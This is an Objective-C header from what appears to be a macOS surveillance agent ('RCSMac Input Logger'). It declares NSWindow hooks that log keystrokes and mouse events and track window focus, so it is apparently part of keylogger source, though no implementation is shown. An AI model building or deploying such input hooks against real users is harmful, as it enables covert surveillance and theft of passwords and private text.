/*
 * RCSMac - Input Logger Agent (Mouse and Keyboard)
 * 
 * Created by Alfredo 'revenge' Pesoli on 12/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#define KEY_MAX_BUFFER_SIZE   0x10

extern int mouseAgentIsActive;
extern int keylogAgentIsActive;


@interface NSWindow (inputLoggerHook)

//
// Left only for testing purposes
//
- (IMP)getImplementationOf: (SEL)lookup after: (IMP)skip;

- (void)logMouse;
- (void)logKeyboard: (NSEvent *)event;
- (void)hookKeyboardAndMouse: (NSEvent *)event;

//
// These are used in order to figure when the focus has been given/taken
// to/from the current process
//
- (void)becomeKeyWindowHook;
- (void)resignKeyWindowHook;

@end
